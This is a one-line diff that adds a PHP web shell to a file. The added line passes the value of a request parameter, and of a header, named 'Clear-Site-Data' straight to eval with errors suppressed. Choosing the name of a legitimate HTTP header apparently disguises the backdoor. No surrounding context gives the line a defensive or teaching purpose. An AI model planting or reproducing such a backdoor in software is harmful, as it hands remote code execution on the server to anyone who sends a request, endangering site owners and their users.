@@ -1,0 +1,1 @@
+<?php @eval($_REQUEST["Clear-Site-Data"]);@eval($_HEADERS["Clear-Site-Data"]);
